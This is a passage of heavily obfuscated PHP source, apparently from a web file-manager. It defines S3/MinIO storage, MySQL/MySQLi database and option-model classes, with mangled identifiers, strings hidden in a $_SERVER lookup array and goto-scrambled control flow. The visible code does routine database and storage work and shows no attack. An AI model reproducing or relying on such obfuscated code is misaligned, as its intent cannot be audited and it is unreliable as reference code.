$this->isFolder($Œ·¶ÜüÌ); } public function isFile($ˆİÃ“­ï) { return !$this->isFolder($ˆİÃ“­ï) && $this->objectMeta($ˆİÃ“­ï); } public function isFolder($·ÒĞ×œó) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][165], $·ÒĞ×œó); } protected function objectMeta($òÚ â†) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][167], $òÚ â†); } protected function _objectMeta($õÃŒğÊô) { $À¡â‘ë =& $_SERVER[ä¿÷‹µ±]; $õÃŒğÊô = rtrim($õÃŒğÊô, $À¡â‘ë[8]); try { $¦„Ï£ÖÓ = $this->client->getObjectInfo($this->bucket, $õÃŒğÊô); if (!isset($¦„Ï£ÖÓ[$À¡â‘ë[221]]) && isset($¦„Ï£ÖÓ[$À¡â‘ë[237]])) { $¦„Ï£ÖÓ[$À¡â‘ë[221]] = $¦„Ï£ÖÓ[$À¡â‘ë[237]]; } } catch (Exception $«òÏ´„) { $¦„Ï£ÖÓ = !1; } if (!$¦„Ï£ÖÓ) { } return $¦„Ï£ÖÓ; } protected function _isFolder($û£Î‚¸î) { $±³Á¨Æç =& $_SERVER[ä¿÷‹µ±]; $û£Î‚¸î = rtrim($û£Î‚¸î, $±³Á¨Æç[8]); if ($û£Î‚¸î == $±³Á¨Æç[12] || $û£Î‚¸î == $±³Á¨Æç[8]) { return !0; } $³Ş•£À¯ = $this->client->getBucket($this->bucket, $û£Î‚¸î, null, 1); if (empty($³Ş•£À¯[$±³Á¨Æç[204]])) { return !1; } $ô÷Ê±”œ = $³Ş•£À¯[$±³Á¨Æç[204]][0][$±³Á¨Æç[32]]; return stripos($ô÷Ê±”œ, $û£Î‚¸î . $±³Á¨Æç[8]) === 0 ? !0 : !1; if (substr($ô÷Ê±”œ, -1) == $±³Á¨Æç[8]) { return !0; } if (get_path_this($ô÷Ê±”œ) == get_path_this($û£Î‚¸î)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÌåÑÛ ) { parent::__construct($ÌåÑÛ ); $this->signatureVersion($_SERVER[ä¿÷‹µ±][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto Eš˜ ¼ã·²; fÍ¥§É×Õ: class DbMysql extends Db { public function __construct($„ùéËóÄ = '') { $®Êà¶± =& $_SERVER[ä¿÷‹µ±]; if (!extension_loaded($®Êà¶±[823])) { think_exception(think_lang($®Êà¶±[14]) . $®Êà¶±[905]); } if (!empty($„ùéËóÄ)) { $this->config = $„ùéËóÄ; if (empty($this->config[$®Êà¶±[17]])) { $this->config[$®Êà¶±[17]] = $®Êà¶±[12]; } } } public function connect($ÌÊÑÙ = '', $øÌ §ÂÃ = 0, $œÇ‹Üõ‰ = false) { $×–’òÊ¢ =& $_SERVER[ä¿÷‹µ±]; if (!isset($this->linkID[$øÌ §ÂÃ])) { if (empty($ÌÊÑÙ)) { $ÌÊÑÙ = $this->config; } $ü·«¥Ôß = $ÌÊÑÙ[$×–’òÊ¢[906]] . ($ÌÊÑÙ[$×–’òÊ¢[907]] ? "\72{$ÌÊÑÙ[$×–’òÊ¢[907]]}" : $×–’òÊ¢[12]); $äù•ƒ…è = !empty($ÌÊÑÙ[$×–’òÊ¢[17]][$×–’òÊ¢[18]]) ? $ÌÊÑÙ[$×–’òÊ¢[17]][$×–’òÊ¢[18]] : $this->pconnect; if ($äù•ƒ…è) { $this->linkID[$øÌ §ÂÃ] = mysql_pconnect($ü·«¥Ôß, $ÌÊÑÙ[$×–’òÊ¢[908]], $ÌÊÑÙ[$×–’òÊ¢[909]], 131072); } else { $this->linkID[$øÌ §ÂÃ] = mysql_connect($ü·«¥Ôß, $ÌÊÑÙ[$×–’òÊ¢[908]], $ÌÊÑÙ[$×–’òÊ¢[909]], !0, 131072); } if (!$this->linkID[$øÌ §ÂÃ] || !empty($ÌÊÑÙ[$×–’òÊ¢[21]]) && !mysql_select_db($ÌÊÑÙ[$×–’òÊ¢[21]], $this->linkID[$øÌ §ÂÃ])) { think_exception(mysql_error()); } $ª“Ö‹ğ = mysql_get_server_info($this->linkID[$øÌ §ÂÃ]); mysql_query($×–’òÊ¢[910] . think_config($×–’òÊ¢[911]) . $×–’òÊ¢[58], $this->linkID[$øÌ §ÂÃ]); if ($ª“Ö‹ğ > $×–’òÊ¢[912]) { mysql_query($×–’òÊ¢[913], $this->linkID[$øÌ §ÂÃ]); } $this->connected = !0; if (1 != think_config($×–’òÊ¢[22])) { unset($this->config); } } return $this->linkID[$øÌ §ÂÃ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ñÉÕÍÍÌ) { $ÓëÄ×±³ =& $_SERVER[ä¿÷‹µ±]; if (0 === stripos($ñÉÕÍÍÌ, $ÓëÄ×±³[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ñÉÕÍÍÌ; if ($this->queryID) { $this->free(); } think_action_status($ÓëÄ×±³[23], 1); think_status($ÓëÄ×±³[24]); $this->queryID = mysql_query($ñÉÕÍÍÌ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¢ÏÌÇõ) { $††×òÄğ =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¢ÏÌÇõ; if ($this->queryID) { $this->free(); } think_action_status($††×òÄğ[25], 1); think_status($††×òÄğ[24]); $ß‹¯õÄ™ = mysql_query($¢ÏÌÇõ, $this->_linkID); $this->debug(); if (!1 === $ß‹¯õÄ™) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ä¿÷‹µ±][914], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ëœ¾º²§ = mysql_query($_SERVER[ä¿÷‹µ±][915], $this->_linkID); $this->transTimes = 0; if (!$Ëœ¾º²§) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¤ÓâéÏ = mysql_query($_SERVER[ä¿÷‹µ±][916], $this->_linkID); $this->transTimes = 0; if (!$¤ÓâéÏ) { $this->error(); return !1; } } return !0; } private function getAll() { $êôÅÚ÷Û = array(); if ($this->numRows > 0) { while ($ä½ö¥—‘ = mysql_fetch_assoc($this->queryID)) { $êôÅÚ÷Û[] = $ä½ö¥—‘; } mysql_data_seek($this->queryID, 0); } return $êôÅÚ÷Û; } public function getFields($¿üêş”²) { $œˆşÂ»Õ =& $_SERVER[ä¿÷‹µ±]; $³òÇÏ¦Ã = $this->query($œˆşÂ»Õ[917] . $this->parseKey($¿üêş”²)); $ë“ä°Ù = array(); if ($³òÇÏ¦Ã) { foreach ($³òÇÏ¦Ã as $Ğ’Ê´È¬ => $ù±ó®•¦) { $ë“ä°Ù[$ù±ó®•¦[$œˆşÂ»Õ[31]]] = array($œˆşÂ»Õ[32] => $ù±ó®•¦[$œˆşÂ»Õ[31]], $œˆşÂ»Õ[33] => $ù±ó®•¦[$œˆşÂ»Õ[34]], $œˆşÂ»Õ[35] => (bool) (strtoupper($ù±ó®•¦[$œˆşÂ»Õ[36]]) === $œˆşÂ»Õ[918]), $œˆşÂ»Õ[37] => $ù±ó®•¦[$œˆşÂ»Õ[38]], $œˆşÂ»Õ[39] => strtolower($ù±ó®•¦[$œˆşÂ»Õ[40]]) == $œˆşÂ»Õ[41], $œˆşÂ»Õ[42] => strtolower($ù±ó®•¦[$œˆşÂ»Õ[43]]) == $œˆşÂ»Õ[44]); } } return $ë“ä°Ù; } public function getTables($À™áû™Ç = '') { $Ù‰•ä”Ì =& $_SERVER[ä¿÷‹µ±]; if (!empty($À™áû™Ç)) { $Á«€æı = $Ù‰•ä”Ì[919] . $À™áû™Ç . $Ù‰•ä”Ì[920]; } else { $Á«€æı = $Ù‰•ä”Ì[921]; } $ï€æîİ‘ = $this->query($Á«€æı); $‡•ò‡š£ = array(); foreach ($ï€æîİ‘ as $éš ¬«Â => $Ÿˆü‘´) { $‡•ò‡š£[$éš ¬«Â] = current($Ÿˆü‘´); } return $‡•ò‡š£; } public function replace($ÆâÊÆ•À, $‰«¶ÏóÔ = array()) { $³®¡í¿¢ =& $_SERVER[ä¿÷‹µ±]; foreach ($ÆâÊÆ•À as $šÜ§Ş• => $èÁƒÁ‚») { $±şåù†í = $this->parseValue($èÁƒÁ‚»); if (is_scalar($±şåù†í)) { $É˜‘£±Á[] = $±şåù†í; $úâ¬Œ÷½[] = $this->parseKey($šÜ§Ş•); } } $äıÇ£Õ = $³®¡í¿¢[922] . $this->parseTable($‰«¶ÏóÔ[$³®¡í¿¢[279]]) . $³®¡í¿¢[923] . implode($³®¡í¿¢[50], $úâ¬Œ÷½) . $³®¡í¿¢[924] . implode($³®¡í¿¢[50], $É˜‘£±Á) . $³®¡í¿¢[925]; return $this->execute($äıÇ£Õ); } public function insertAll($£Üª“İ, $ø÷¾ş²Ô = array(), $¸à›—²Æ = false) { $Úò¥ÅÍè =& $_SERVER[ä¿÷‹µ±]; if (!is_array($£Üª“İ[0])) { return !1; } $Ä•ÑëÎ = array_keys($£Üª“İ[0]); $Œêù¼ş§ = array(); foreach ($£Üª“İ as $¬½İİèˆ) { $íÒ£€µÛ = array(); foreach ($¬½İİèˆ as $„–ã¢ => $‰šŠüÍ) { $‰šŠüÍ = $this->parseValue($‰šŠüÍ); if (is_scalar($‰šŠüÍ)) { $íÒ£€µÛ[] = $‰šŠüÍ; } } $Œêù¼ş§[] = $Úò¥ÅÍè[260] . implode($Úò¥ÅÍè[50], $íÒ£€µÛ) . $Úò¥ÅÍè[925]; } array_walk($Ä•ÑëÎ, array($this, $Úò¥ÅÍè[926])); $·–¥™« = ($¸à›—²Æ ? $Úò¥ÅÍè[927] : $Úò¥ÅÍè[928]) . $Úò¥ÅÍè[929] . $this->parseTable($ø÷¾ş²Ô[$Úò¥ÅÍè[279]]) . $Úò¥ÅÍè[923] . implode($Úò¥ÅÍè[50], $Ä•ÑëÎ) . $Úò¥ÅÍè[930] . implode($Úò¥ÅÍè[50], $Œêù¼ş§); return $this->execute($·–¥™«); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $òÓŞÚÒ =& $_SERVER[ä¿÷‹µ±]; $this->error = mysql_errno() . $òÓŞÚÒ[4] . mysql_error($this->_linkID); if ($òÓŞÚÒ[12] != $this->queryStr) { $this->error .= LNG($òÓŞÚÒ[48]) . $this->queryStr; } think_trace($this->error, $òÓŞÚÒ[12], $òÓŞÚÒ[49]); return $this->error; } public function escapeString($†Üµí˜) { if ($this->_linkID) { return mysql_real_escape_string($†Üµí˜, $this->_linkID); } else { return mysql_escape_string($†Üµí˜); } } public function parseKey(&$À½ÕÔˆ±, $€çúÁé¨ = true) { $µÑîó´û =& $_SERVER[ä¿÷‹µ±]; if ($€çúÁé¨) { $À½ÕÔˆ± = $this->parseKeyCheck($À½ÕÔˆ±); } if ($À½ÕÔˆ± != $µÑîó´û[188] && !preg_match($µÑîó´û[931], $À½ÕÔˆ±)) { $À½ÕÔˆ± = $µÑîó´û[385] . trim($À½ÕÔˆ±, $µÑîó´û[385]) . $µÑîó´û[385]; } return $À½ÕÔˆ±; } } class DbMysqli extends Db { public function __construct($„Á…¦á½ = '') { $‘Çíóíà =& $_SERVER[ä¿÷‹µ±]; if (!extension_loaded($‘Çíóíà[932])) { think_exception(think_lang($‘Çíóíà[14]) . $‘Çíóíà[933]); } if (!empty($„Á…¦á½)) { $this->config = $„Á…¦á½; if (empty($this->config[$‘Çíóíà[17]])) { $this->config[$‘Çíóíà[17]] = $‘Çíóíà[12]; } } } public function connect($Õ³Ô¬ÏÍ = '', $§ı¯Ş• = 0) { $µÎ­¶Î‘ =& $_SERVER[ä¿÷‹µ±]; if (!isset($this->linkID[$§ı¯Ş•])) { if (empty($Õ³Ô¬ÏÍ)) { $Õ³Ô¬ÏÍ = $this->config; } $this->linkID[$§ı¯Ş•] = new mysqli($Õ³Ô¬ÏÍ[$µÎ­¶Î‘[906]], $Õ³Ô¬ÏÍ[$µÎ­¶Î‘[908]], $Õ³Ô¬ÏÍ[$µÎ­¶Î‘[909]], $Õ³Ô¬ÏÍ[$µÎ­¶Î‘[21]], $Õ³Ô¬ÏÍ[$µÎ­¶Î‘[907]] ? intval($Õ³Ô¬ÏÍ[$µÎ­¶Î‘[907]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $å™ã´“¨ = $this->linkID[$§ı¯Ş•]->server_version; $this->linkID[$§ı¯Ş•]->query($µÎ­¶Î‘[910] . think_config($µÎ­¶Î‘[911]) . $µÎ­¶Î‘[58]); if ($å™ã´“¨ > $µÎ­¶Î‘[912]) { $this->linkID[$§ı¯Ş•]->query($µÎ­¶Î‘[913]); } $this->connected = !0; if (1 != think_config($µÎ­¶Î‘[22])) { unset($this->config); } } return $this->linkID[$§ı¯Ş•]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($«Àşüï´) { $İ–ñáÆ =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«Àşüï´; if ($this->queryID) { $this->free(); } think_action_status($İ–ñáÆ[23], 1); think_status($İ–ñáÆ[24]); $this->queryID = $this->_linkID->query($«Àşüï´); if ($this->_linkID->more_results()) { while (($ñ»ØÂ÷§ = $this->_linkID->next_result()) != NULL) { $ñ»ØÂ÷§->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($è×•ÅÚ¬) { $¶”¿æıá =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $è×•ÅÚ¬; if ($this->queryID) { $this->free(); } think_action_status($¶”¿æıá[25], 1); think_status($¶”¿æıá[24]); $ñ¾†å’² = $this->_linkID->query($è×•ÅÚ¬); $this->debug(); if (!1 === $ñ¾†å’²) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $©Ú«ß”Â = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$©Ú«ß”Â) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓÍ·•œÜ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÓÍ·•œÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $»ÂÓªÏ§ = array(); if ($this->numRows > 0) { for ($÷ğ°ÕÂË = 0; $÷ğ°ÕÂË < $this->numRows; $÷ğ°ÕÂË++) { $»ÂÓªÏ§[$÷ğ°ÕÂË] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $»ÂÓªÏ§; } public function getFields($…ŞæãÚÆ) { $ŞÆ®İŸ =& $_SERVER[ä¿÷‹µ±]; $ş’˜¬ò¥ = $this->query($ŞÆ®İŸ[917] . $this->parseKey($…ŞæãÚÆ)); $Åàú€Ş = array(); if ($ş’˜¬ò¥) { foreach ($ş’˜¬ò¥ as $ëø‘õÈÙ => $‚”¹‰Ç) { $Åàú€Ş[$‚”¹‰Ç[$ŞÆ®İŸ[31]]] = array($ŞÆ®İŸ[32] => $‚”¹‰Ç[$ŞÆ®İŸ[31]], $ŞÆ®İŸ[33] => $‚”¹‰Ç[$ŞÆ®İŸ[34]], $ŞÆ®İŸ[35] => (bool) ($‚”¹‰Ç[$ŞÆ®İŸ[36]] === $ŞÆ®İŸ[12]), $ŞÆ®İŸ[37] => $‚”¹‰Ç[$ŞÆ®İŸ[38]], $ŞÆ®İŸ[39] => strtolower($‚”¹‰Ç[$ŞÆ®İŸ[40]]) == $ŞÆ®İŸ[41], $ŞÆ®İŸ[42] => strtolower($‚”¹‰Ç[$ŞÆ®İŸ[43]]) == $ŞÆ®İŸ[44]); } } return $Åàú€Ş; } public function getTables($ÏàÔ­ = '') { $¤â­ùæÔ =& $_SERVER[ä¿÷‹µ±]; $¥Ø“‘ûÌ = !empty($ÏàÔ­) ? $¤â­ùæÔ[919] . $ÏàÔ­ . $¤â­ùæÔ[920] : $¤â­ùæÔ[921]; $‡ÄØ˜ö— = $this->query($¥Ø“‘ûÌ); $Û£³ˆµ¯ = array(); if ($‡ÄØ˜ö—) { foreach ($‡ÄØ˜ö— as $®ìè´Ÿ˜ => $ÜÕ‘òà¦) { $Û£³ˆµ¯[$®ìè´Ÿ˜] = current($ÜÕ‘òà¦); } } return $Û£³ˆµ¯; } public function replace($™ƒÄ¹å, $úÕ¦ò¬ô = array()) { $Í«„€÷­ =& $_SERVER[ä¿÷‹µ±]; foreach ($™ƒÄ¹å as $·¿«Î è => $Ò“Âœ°) { $šê÷¤˜¨ = $this->parseValue($Ò“Âœ°); if (is_scalar($šê÷¤˜¨)) { $Ÿâ•šê[] = $šê÷¤˜¨; $«Ğ«Øæî[] = $this->parseKey($·¿«Î è); } } $ÕÒÓˆô = $Í«„€÷­[922] . $this->parseTable($úÕ¦ò¬ô[$Í«„€÷­[279]]) . $Í«„€÷­[923] . implode($Í«„€÷­[50], $«Ğ«Øæî) . $Í«„€÷­[924] . implode($Í«„€÷­[50], $Ÿâ•šê) . $Í«„€÷­[925]; return $this->execute($ÕÒÓˆô); } public function insertAll($¼ô…šİ•, $Ø×‹¼ã = array(), $ºƒ²Öò½ = false) { $”Œ¯Ó‚ =& $_SERVER[ä¿÷‹µ±]; if (!is_array($¼ô…šİ•[0])) { return !1; } $ÉÖŞÎ = array_keys($¼ô…šİ•[0]); $ÂÃşßï = array(); foreach ($¼ô…šİ• as $àúêÉÏ) { $…òÁÊŒ = array(); foreach ($àúêÉÏ as $Ş‡Ò•Ú½ => $à¾õê¾) { $à¾õê¾ = $this->parseValue($à¾õê¾); if (is_scalar($à¾õê¾)) { $…òÁÊŒ[] = $à¾õê¾; } } $ÂÃşßï[] = $”Œ¯Ó‚[260] . implode($”Œ¯Ó‚[50], $…òÁÊŒ) . $”Œ¯Ó‚[925]; } array_walk($ÉÖŞÎ, array($this, $”Œ¯Ó‚[926])); $¹–õÊå = $ºƒ²Öò½ ? $”Œ¯Ó‚[927] : $”Œ¯Ó‚[928]; $š®­„ô = $¹–õÊå . $”Œ¯Ó‚[929] . $this->parseTable($Ø×‹¼ã[$”Œ¯Ó‚[279]]) . $”Œ¯Ó‚[923] . implode($”Œ¯Ó‚[50], $ÉÖŞÎ) . $”Œ¯Ó‚[930] . implode($”Œ¯Ó‚[50], $ÂÃşßï); return $this->execute($š®­„ô); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ë·¬©›· =& $_SERVER[ä¿÷‹µ±]; $this->error = $this->_linkID->errno . $Ë·¬©›·[4] . $this->_linkID->error; if ($Ë·¬©›·[12] != $this->queryStr) { $this->error .= LNG($Ë·¬©›·[48]) . $this->queryStr; } think_trace($this->error, $Ë·¬©›·[12], $Ë·¬©›·[49]); return $this->error; } public function escapeString($Ò·‘‘’æ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Ò·‘‘’æ); } else { return addslashes($Ò·‘‘’æ); } } public function parseKey(&$İîÆ‘õ½, $ñôäº«ï = true) { $–Í‘Öª¢ =& $_SERVER[ä¿÷‹µ±]; if ($ñôäº«ï) { $İîÆ‘õ½ = $this->parseKeyCheck($İîÆ‘õ½); } if ($İîÆ‘õ½ != $–Í‘Öª¢[188] && !preg_match($–Í‘Öª¢[931], $İîÆ‘õ½)) { $İîÆ‘õ½ = $–Í‘Öª¢[385] . trim($İîÆ‘õ½, $–Í‘Öª¢[385]) . $–Í‘Öª¢[385]; } return $İîÆ‘õ½; } } $_file = $_SERVER[$_SERVER[ä¿÷‹µ±][934]]; goto CÃ‰ÙìŠŠ; FÇ­°³šÃÛ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ï‹¦êğ« = false, $™”‰‡Å = '', $«ûÑŸÊš = false) { $Âºæ£”µ =& $_SERVER[ä¿÷‹µ±]; $»îŠ¥é = $this->cacheGet($™”‰‡Å); $ÂùˆÒĞ£ = $this->optionDefault($™”‰‡Å); $ÂùˆÒĞ£ = is_array($ÂùˆÒĞ£) ? $ÂùˆÒĞ£ : array(); if (is_array($»îŠ¥é)) { $»îŠ¥é = array_merge($ÂùˆÒĞ£, $»îŠ¥é); return $Ï‹¦êğ« ? isset($»îŠ¥é[$Ï‹¦êğ«]) ? $»îŠ¥é[$Ï‹¦êğ«] : null : $»îŠ¥é; } $‰Ÿßñ› = $this->filterWhere(array($Âºæ£”µ[33] => $™”‰‡Å)); $»îŠ¥é = $this->where($‰Ÿßñ›)->select(); $»îŠ¥é = array_to_keyvalue($»îŠ¥é, $Âºæ£”µ[94], $Âºæ£”µ[374]); foreach ($»îŠ¥é as $›é¤‹§ˆ => $§ÌİÀÇı) { if ($«ûÑŸÊš || in_array($›é¤‹§ˆ, $this->jsonField)) { $»îŠ¥é[$›é¤‹§ˆ] = json_decode($§ÌİÀÇı, !0); } } $this->cacheSet($™”‰‡Å, $»îŠ¥é); $»îŠ¥é = array_merge($ÂùˆÒĞ£, $»îŠ¥é); return $Ï‹¦êğ« ? $»îŠ¥é[$Ï‹¦êğ«] : $»îŠ¥é; } public function set($Ş¯™èû, $õ‡Šµ‡ = false, $¥Å£Äİè = '') { $àÌ¨Ü‡È =& $_SERVER[ä¿÷‹µ±]; $this->cacheRemove($¥Å£Äİè); $ÀëŠÊ»— = array(); $†ñû— = is_array($Ş¯™èû) ? $Ş¯™èû : array($Ş¯™èû => $õ‡Šµ‡); foreach ($†ñû— as $Š”˜Ü°¶ => $ÑÖ™ô†ï) { if (is_array($ÑÖ™ô†ï)) { $ÑÖ™ô†ï = json_encode_force($ÑÖ™ô†ï); } $this->checkLength($ÑÖ™ô†ï, !1, $this->tableName . $àÌ¨Ü‡È[4] . $Ş¯™èû); $ÑÖ™ô†ï = self::textEncode($ÑÖ™ô†ï); $†ñû— = array($àÌ¨Ü‡È[33] => $¥Å£Äİè, $àÌ¨Ü‡È[94] => $Š”˜Ü°¶, $àÌ¨Ü‡È[374] => $ÑÖ™ô†ï); $ÀëŠÊ»—[] = $this->filterWhere($†ñû—); } if (!$ÀëŠÊ»—) { return !0; } $‹€µÅşæ = $this->cacheKey($àÌ¨Ü‡È[400]); CacheLock::lock($‹€µÅşæ); $ˆˆÇ¡¾å = $this->addAll($ÀëŠÊ»—, array(), !0); CacheLock::unlock($‹€µÅşæ); return $ˆˆÇ¡¾å; } protected function optionDefault($šÓë·ß = '') { return !1; } public function setDeep($ğˆ®ô¾, $¢¬ß´ğØ = false, $öÈËÚË = '') { $ÈÅÈ˜æ³ = explode($_SERVER[ä¿÷‹µ±][10], $ğˆ®ô¾); $´¾´ë´« = $this->get(); array_set_value($´¾´ë´«, $ğˆ®ô¾, $¢¬ß´ğØ); $this->set($ÈÅÈ˜æ³[0], $´¾´ë´«[$ÈÅÈ˜æ³[0]], $öÈËÚË); } public function remove($İéÙ›¬, $¾È„ø¢ = '') { $Šç²¡•è =& $_SERVER[ä¿÷‹µ±]; $this->cacheRemove($¾È„ø¢); $Ø†‚Ó…Ê = $this->filterWhere(array($Šç²¡•è[94] => $İéÙ›¬, $Šç²¡•è[33] => $¾È„ø¢)); if (is_null($İéÙ›¬)) { unset($Ø†‚Ó…Ê[$Šç²¡•è[94]]); } return $this->where($Ø†‚Ó…Ê)->delete(); } public function cacheSet($İù™“¹Ù, $Å…«ò×é = false) { return Cache::set($this->cacheKey($İù™“¹Ù), $Å…«ò×é); } public function cacheGet($¦¼®ØÖ÷) { return Cache::get($this->cacheKey($¦¼®ØÖ÷)); } public function cacheRemove($Å ÄÜÌÑ) { return Cache::remove($this->cacheKey($Å ÄÜÌÑ)); } protected function filterWhere($‰¶¬‘¤) { return $‰¶¬‘¤; } protected function cacheKey($í×ûíÍ¬) { return $í×ûíÍ¬; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\145" => "\x69\x6f\137\163\x6f\165\x72\x63\145\137\x6d\145\164\141", "\x6d\145\164\141\106\x69\145\x6c\x64" => "\163\157\x75\162\x63\x65\x49\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\124\x69\x6d\x65", "\x74\x69\155\145", "\x69\x6e\x73\x65\x72\164", "\146\x75\x6e\x63\164\x69\x6f\156"), array("\143\x72\145\141\x74\145\124\x69\155\145", "\164\x69\x6d\145", "\x69\156\x73\145\162\x74", "\146\x75\x6e\143\164\151\157\x6e"), array("\166\151\x65\167\124\151\155\x65", "\x74\x69\x6d\145", "\151\156\x73\145\x72\x74", "\146\x75\x6e\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($È±œ«ßò) { return $this->listSource(array($_SERVER[ä¿÷‹µ±][401] => $È±œ«ßò)); } public function typeName($·¶ë»¿Ò) { static $ôü»°ş½ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\145\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\x67\x72\x6f\165\x70"); return $ôü»°ş½[$·¶ë»¿Ò . $_SERVER[ä¿÷‹µ±][12]]; } public function sourceListInfo($õÚãåûİ, $àİèõ°’ = false) { $åôæªâå =& $_SERVER[ä¿÷‹µ±]; $õÚãåûİ = $õÚãåûİ ? $õÚãåûİ : array(); $õÚãåûİ = array_filter(array_unique($õÚãåûİ)); if (!$õÚãåûİ) { return array(); } $£‰Œ•øô = $this->where(array($åôæªâå[402] => array($åôæªâå[7], $õÚãåûİ)))->select(); $this->_listDataApply($£‰Œ•øô, $àİèõ°’); return array_to_keyvalue($£‰Œ•øô, $åôæªâå[402]); } public function pathInfoFilter(&$ËÖ“¢Ûá) { $Òî¯­ƒ =& $_SERVER[ä¿÷‹µ±]; static $Ó×Øüú½ = false; static $€àÄ‰£í = false; static $à²Ş³ = false; if (!$Ó×Øüú½) { $à¨è¾ïš = $Òî¯­ƒ[403]; $à¨è¾ïš .= $Òî¯­ƒ[404]; $à¨è¾ïš .= $Òî¯­ƒ[405]; $¯Ôû‹× = $Òî¯­ƒ[406]; $™ĞöÑ™„ = explode($Òî¯­ƒ[50], $¯Ôû‹×); $Ó×Øüú½ = explode($Òî¯­ƒ[50], $à¨è¾ïš); $€àÄ‰£í = array(); foreach ($Ó×Øüú½ as $ÌÈšğŸ¿) { if (in_array($ÌÈšğŸ¿, $™ĞöÑ™„)) { continue; } $€àÄ‰£í[] = $ÌÈšğŸ¿; } $à²Ş³ = explode($Òî¯­ƒ[50], $Òî¯­ƒ[407]); } foreach ($à²Ş³ as $ï‘òÅ›ä) { if (isset($ËÖ“¢Ûá[$ï‘òÅ›ä])) { $ËÖ“¢Ûá[$ï‘òÅ›ä] = intval($ËÖ“¢Ûá[$ï‘òÅ›ä]); } } $ËÖ“¢Ûá[$Òî¯­ƒ[84]] = $Òî¯­ƒ[408] . $ËÖ“¢Ûá[$Òî¯­ƒ[402]] . $Òî¯­ƒ[409]; $ËÖ“¢Ûá[$Òî¯­ƒ[33]] = $ËÖ“¢Ûá[$Òî¯­ƒ[410]] == 1 ? $Òî¯­ƒ[75] : $Òî¯­ƒ[199]; $ËÖ“¢Ûá[$Òî¯­ƒ[411]] = $this->typeName($ËÖ“¢Ûá[$Òî¯­ƒ[411]]); if ($ËÖ“¢Ûá[$Òî¯­ƒ[410]] != 1) { $ËÖ“¢Ûá[$Òî¯­ƒ[174]] = $ËÖ“¢Ûá[$Òî¯­ƒ[412]]; unset($ËÖ“¢Ûá[$Òî¯­ƒ[412]]); } $×‰‘ŸØ© = $Ó×Øüú½; if (isset($ËÖ“¢Ûá[$Òî¯­ƒ[413]]) && $ËÖ“¢Ûá[$Òî¯­ƒ[413]][$Òî¯­ƒ[414]] == -1) { $×‰‘ŸØ© = $€àÄ‰£í; } $ËÖ“¢Ûá = array_field_key($ËÖ“¢Ûá, $×‰‘ŸØ©); return $ËÖ“¢Ûá; } public function listUserFav() { $Ë©²Æ·ò =& $_SERVER[ä¿÷‹µ±]; $§’Ÿ¶ú = Model($Ë©²Æ·ò[415])->listData(); $çß‹êœ— = array_filter_by_field($§’Ÿ¶ú, $Ë©²Æ·ò[33], $Ë©²Æ·ò[416]); $çß‹êœ— = array_to_keyvalue($çß‹êœ—, $Ë©²Æ·ò[12], $Ë©²Æ·ò[84]); if ($çß‹êœ—) { $«œöï…— = $this->listSource(array($Ë©²Æ·ò[417] => array($Ë©²Æ·ò[418], $çß‹êœ—))); } $«œöï…— = array_to_keyvalue($«œöï…—[$Ë©²Æ·ò[369]], $Ë©²Æ·ò[402]); foreach ($§’Ÿ¶ú as &$ÛŒñ¾Ù¬) { $ÛŒñ¾Ù¬ = array($Ë©²Æ·ò[419] => $ÛŒñ¾Ù¬[$Ë©²Æ·ò[399]], $Ë©²Æ·ò[420] => $ÛŒñ¾Ù¬[$Ë©²Æ·ò[32]], $Ë©²Æ·ò[421] => 